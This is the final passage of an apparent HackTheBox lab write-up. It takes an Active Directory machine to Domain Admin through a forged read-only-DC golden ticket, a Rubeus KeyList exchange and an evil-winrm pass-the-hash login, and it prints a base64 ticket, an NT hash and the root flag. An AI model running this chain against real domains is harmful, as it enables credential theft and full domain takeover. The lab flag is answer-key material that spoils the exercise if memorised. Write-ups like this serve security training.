      doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB58yPraW/y4wGOvcwLn1W75Pzmv0lrrPe3AzbUH8FIkHSczpuAMMzBMqYImdtMAdyBElSDjZKV8j2PMtfwG7bAfiFrRlz8kxWZXPYUvFRsXwk3yO4xmt7lN3NlQKCePprzT+DD8yXTnqMzuS4h2vYeIngieQaL7W9w54SWxyRWGQXf1u5UGMztylx/zv/KnPgSJ2OrYrzlUCGYlLL2G9DNe1H2z6xrIkHH98oUXPHsEcjpF6+UkEDaBW6O06EekAfVE8plgEw5SNyNe+a3dyzcr3B0pVh1zPj2MrVP0Cykd7W8WKrqxV/Wl/o5yk14blYxrE/bgzgr+51cAPFX927HQ8IY+sbvop5wZJWxprzNCZR8ItDcfLsfk7aRLcoccwQCuyreNZdG9EboTQgbvv5GbD0YaS3DW7wBYX7/FoBVJtaim+XAb3olkJM4OSFFjEX/LfGS6pg8SmcIzn/FMRdeNz8XFqJw/VttYmJWaLP1CiAQ+YTfn3ruWKSm0LurC0itq73mBW/uJosuwCHLJ79743fyO0xjR34hAmrmeDtpAuweROkoplyk3grZQqMeLX26fk0nk8d4l5dg02uxomHnuN4afZgNwi2iMLcjeuLMg5eE8FW1C6NguFNT3iaD7HvMIbbw4eQgK2Cj78z4pYsJ7uf+Q+sWLpmnDS8Beah2pXmfnz//8CS4VE3vQdZXos8GW3SVckKwVtYH6GJK0AZ5fyQIuQP/u9YFtWDDL6LG0r24iv9nrLgo66xFtcHCfNoNd61CWB87V63395/A0rGQVWu5fhi0rAMlrH16D9tFlpYQajonQ7pKVcA66WebOjwxmTAQePrzkMIrgDvMTDp/HMDyWnVyzYBo2jIjUJEKVRRaDKygKXN7f51Ss5fiKlPndFQGQs+74L2/fGWhkExbdhYZPrfBm0GvAt067rGUkVijw3GeH9kGwPgfNwlGGh6yXFnzz7FAzNuNu+Th0/NjToNaLLvbo8IGkcr4L3TGcVVASOMJ389wafUnPRbVXF1RKCk9UVjTxyJFVb6EtTvN5GRa1mr7heRawfhXuhPbeZG971Tp5/CrY3FzC7m7kHFb0QnJ4BAasuATL02QkxwjBV7pmcvhFDtp4ep3WpoA9Vmemi7pUGTWITzar2xLI4n6zda4PnYrr5otO+3WBTzw6xns5WrHMMUo9e6i/tB2FNXTcs5AvLLsLMmkBM3aE7s3XYjKTLEtwsYEfft+b4pY1TNiQj2r3qnfcTZA/Nx53c27CsXU0Tkpute9AIG/+Id5EyoN14Beu4Dn6UPIwrKBSAo/P+tWGJYF9GBf0dH05cnZ+2yOVNH67sElG0ixVAFguow1cA7S0X1HEJBqVLdKUYx9d6+5ZuVwh0IYIfHifpUmovIcD7UqjWImyIrGLo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQgMD0VA6tgWI/urBrz4gC6uMIBxO4gVUxD/UJ8KRuoMfqhDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQIEAAKQRGA8yMDI2MDQzMDE5MzU1MlqlERgPMjAyNjA0MzAxOTM1NTJaphEYDzIwMjYwNTAxMDUzNTUyWqcRGA8yMDI2MDUwNzE5MzU1MlqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=

[*] Ticket written to ticket_final_2026_04_30_19_35_52_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

```
# KeyList attack - exchange RODC ticket for real DC01-signed TGT
.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:ticket_final_2026_04_30_19_35_52_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*QwbRYL-vYiEIbNZdyWNlAg.png)

**What the KeyList attack does:** The forged RODC TGT is signed with the RODC’s krbtgt key. We send it to DC01 and say “please exchange this for a real TGT.” DC01 checks: is Administrator in `msDS-RevealOnDemandGroup` for RODC01? Yes (we just set that). Is the ticket signature valid for RODC key 8245? Yes (we have the real key). So DC01 returns a **legitimate Administrator TGT** — signed with the main DC's krbtgt key. The output even shows `Password Hash: EE238F6DEBC752010428F20875B092D5` directly.

# **Phase 13 — Domain Admin Shell and root.txt**

bash

```
# On Kali: convert ticket
echo '<base64_from_rubeus>' | tr -d ' \n\t' | base64 -d > /tmp/admin.kirbi
impacket-ticketConverter /tmp/admin.kirbi /tmp/admin.ccache
export KRB5CCNAME=/tmp/admin.ccache
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*xhAQC-MRJtUtjft8ceqYEA.png)

```
# Use the NT hash directly (simpler)
evil-winrm -i 10.129.46.96 -u Administrator -H 'ee238f6debc752010428f20875b092d5'
type C:\Users\Administrator\Desktop\root.txt
# 6bfb2b25c2874c992b1574392bc5b3f8
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*4AZ_gkXLOnr-uy28IfHYBA.png)

# **Full Attack Chain Summary**

StepWhatWhy chosen1NmapStandard first step — identify services2bloodyAD enumFastest way to find writeable AD objects3scriptPath abusej.arbuckle has WriteProperty on l.wilson — scriptPath = code exec on logon4PowerView ACL checkFind what l.wilson can do with her access5Force-change passwordl.wilson has ForceChangePassword right on l.wilson_adm6RODC Administratorsl.wilson_adm can add self — grants local admin on RODC017Ligolo pivotRODC01 is internal — need tunnel through DC018RBCD setupSeMachineAccountPrivilege + WRITE on RODC01 = RBCD attack possible9S4U2Proxy → SYSTEMRBCD lets FAKE$ impersonate Administrator to RODC0110Dump krbtgt_8245SYSTEM on RODC01 → dump the RODC’s signing key11Modify replication policyWithout this DC01 rejects RODC golden tickets for Administrator12Golden ticket + KeyListExchange forged RODC ticket for real DC01 Administrator TGT13PTH → root.txtNT hash from KeyList response used directly

**The biggest lesson from this machine:** Every step follows logically from the one before it. No guessing. Pure enumeration driving every decision. The RODC path opened up the moment we saw `krbtgt_8245` in the user list — everything after that was building toward that key and exploiting it properly.
